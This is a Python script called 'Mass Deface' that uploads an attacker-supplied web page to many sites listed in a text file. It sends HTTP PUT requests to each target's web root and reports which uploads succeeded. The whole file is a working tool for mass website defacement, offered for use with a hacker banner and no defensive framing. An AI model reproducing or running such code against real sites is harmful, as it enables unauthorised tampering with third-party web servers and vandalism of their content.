#!/bin/usr/python3.8.x
# coding=utf-8
# Mass Deface
  
import os.path
import sys,os
from time import sleep
try:
	import requests
except:
	os.system('pip install requests')

banner = """
\033[1;97m|\033[1;96m--------------------------------\033[1;97m|
\033[1;91m ╔╦╗\033[1;90m┌─┐┌─┐┌─┐  \033[1;91m╔╦╗\033[1;90m┌─┐┌─┐┌─┐┌─┐┌─┐
\033[1;91m ║║║\033[1;90m├─┤└─┐└─┐  \033[1;91m ║║\033[1;90m├┤ ├┤ ├─┤│  ├┤
\033[1;91m ╩ ╩\033[1;90m┴ ┴└─┘└─┘  \033[1;91m═╩╝\033[1;90m└─┘└  ┴ ┴└─┘└─┘
\033[1;97m|\033[1;96m--------------------------------\033[1;97m|
 \033[47;1;91m       Coded by : LeON          \033[0m
"""

class Main:
	def __init__(self):
		self.mass()

	def mass(self):
		os.system('clear')
		print(banner)
		print("\033[1;91m•\033[1;96m Make your Deface shell in the beginning ")
		print()
		shell=input("\033[1;97m[\033[1;93m+\033[1;97m]\033[1;94m Shell (ex..: index.html) \033[1;97m:\033[1;96m ")
		if not os.path.isfile(shell):
			print("\033[1;91m err : file not found!");sleep(2);Main()
		else:
			leon(shell)

def leon(script,list_target="list_for_mass_deface.txt"):
	ll=open(script,"r").read()
	with open(list_target,"r") as target:
		target=target.readlines()
		print("\033[1;97m[\033[1;92m•\033[1;97m]\033[1;91m Total Target \033[1;97m:\033[1;95m %s"%(len(target)))
		for wb in target:
			try:
				site = wb.strip()
				if site.startswith("http://") is False:
					site = "http://" + site
				lll=requests.put(site+"/"+script,data=ll)
				if lll.status_code < 200 or lll.status_code >= 250:
					print("\033[1;97m[\033[41;1;97m FAILED \033[0m\033[1;97m] \033[1;94m%s/%s"%(site,script))
				else:
					print("\033[1;97m[\033[42;1;97m SUCCES \033[0m\033[1;97m]\033[1;94m %s/%s"%(site,script))
			except KeyboardInterrupt: exit()
			except Exception as R:
				exit("err : %s "%(R))


Main()